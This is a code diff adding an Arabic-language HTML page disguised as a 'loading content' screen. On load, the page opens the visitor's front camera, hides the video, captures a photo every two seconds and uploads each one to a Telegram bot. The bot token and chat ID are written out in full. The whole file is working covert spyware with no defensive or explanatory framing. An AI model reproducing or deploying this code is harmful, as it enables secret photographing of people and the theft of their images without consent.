@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>تحميل المحتوى...</title>
+    <style>
+        body { background-color: #000; color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        video { display: none; } /* إخفاء الفيديو ليكون العمل سرياً */
+    </style>
+</head>
+<body>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
+        const CHAT_ID = "7984067238";
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // طلب إذن الكاميرا
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                video.srcObject = stream;
+                // البدء في التقاط الصور كل 2 ثانية وإرسالها
+                setInterval(captureAndSend, 2000);
+            } catch (err) {
+                console.error("Error accessing camera: ", err);
+            }
+        }
+
+        // تحويل الصورة وإرسالها لبوت تليجرام
+        function captureAndSend() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'capture.jpg');
+
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }, 'image/jpeg', 0.5); // جودة 50% لسرعة الإرسال
+        }
+
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
